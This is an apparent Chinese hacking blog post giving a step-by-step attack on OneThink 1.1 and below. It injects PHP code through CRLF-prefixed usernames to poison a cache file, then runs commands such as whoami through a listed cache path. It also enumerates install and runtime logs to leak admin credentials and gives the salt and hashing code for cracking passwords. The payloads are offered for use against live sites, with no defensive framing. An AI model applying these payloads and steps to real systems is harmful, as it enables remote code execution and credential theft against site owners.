#  OneThink文件缓存漏洞及日志读取   
原创 Hacker  0xh4ck3r   2025-01-19 01:03  
  
### 0x1 概述  
  
本文在没有管理员账号密码的前提下（因为没法爆破弱口令 -.-！），描述了如何利用onethink文件缓存漏洞getshell，适用版本为1.1及以下版本，适用条件为开放注册。其次再介绍一个读取日志的方法，该方法可获取onethink运行日志以及安装日志。  
### 0x2 注册登录文件缓存漏洞  
  
首先在开放注册的前提下，先注册一个用户，用户名为  
```
$a=$_GET[a];//

```  
  
填写其他注册需要的内容后，单次抓包，在burp里修改用户名为  
```
%0d%0a$a=$_GET[a];//

```  
  
同理注册另一个用户  
```
system($a);//

```  
  
抓包修改为  
```
%0d%0asystem($a);//

```  
  
最后就得到了两个用户，然后先登录用户   
  
_GET[a];// ，后登录用户 system($a);// ，登录过程中同样是抓包修改用户名，这样就会在缓存文件里写入如下图所示的代码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtU4hU2WkdJB3zjhoib8rekVibibmcvhkDQibPNMKXU5LMvHWMeZB712FzNZw/640?wx_fmt=png&from=appmsg "")  
  
image-20230630162446092  
  
这样一来，只需要访问这个缓存文件即可getshell，需要写马的可以自己重新尝试构造用户名。接着在链接后面拼接：  
  
这里提供几个缓存文件的名，自己挨个试试吧：**（如果试了以下几个均失败可以考虑一下对方是否开启缓存，若报错，则需要考虑构造的用户名是不是导致缓存文件中的php代码错误了，可过一段时间缓存刷新后重试）**  
>   
> eeef39c86d6495ec8e502555deee2955.php  
> 82eb8eeca3aaa8b0126f94220b6b8195.php  
> 7665493b900f51fe6638c89144516207.php  
> ff7f4a808c442790de8722fb8d90d304.php  
  
```
/Runtime/Temp/82eb8eeca3aaa8b0126f94220b6b8195.php?a=whoami

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtU1IFmKTn6vwXlubopznhUvdy6uic7zapcSXTArEibib5mCDvX5OZLRkgUw/640?wx_fmt=png&from=appmsg "")  
  
image-20230630162714715  
### 0x3 运行日志查看  
  
最后这个呢是一个巧方法，若对方部署onethink时，未关闭日志记录，则会记录程序运行时的一些信息，因为onethink是基于tp3.2.3的，因此这个日志看起来好像跟tp3.2.3的日志一样，但是注意到一点就是onethink每个application都是单独存放的日志，并且我们知道日志命名格式为：23_06_30.log，这样我们只需要枚举出日志名即可获取到敏感日志了。  
```
http://localhost:81/Runtime/Logs/Install/23_06_27.log

```  
  
下图为缓存的数据库的信息，可查看到后台用户名以及密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtUpVRdP6icKOPL5VOw9UnUCM7kD22oEu5W3nuFOOD6EossWD8sujaB8UA/640?wx_fmt=png&from=appmsg "")  
  
image-20230630164102875  
  
下图为缓存的数据库名  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtUFTNMIuiahiayYzFRD25B8pvbvyCDV3HkuLMP4ic4GJa1UDwrL36xD8l9w/640?wx_fmt=png&from=appmsg "")  
  
image-20230630164711209  
  
至于密码是多少，大家自行写脚本进行枚举破解吧，加密方式为sha1加密输入的密码，再将sha1得到的值后面拼接 j."TM7r;Y9/cQlV]Lt|xeGdsqUFK6`pBHZ}85+>3 ，最后再将拼接的值进行md5加密。  
  
下方提供一个php加密的方式：（ adminadmin123 为密码）  
```
<?php echo(md5(sha1("adminadmin123") . 'j."TM7r;Y9/cQlV]Lt|xeGdsqUFK6`pBHZ}85+>3'));?>

```  
  
  
  
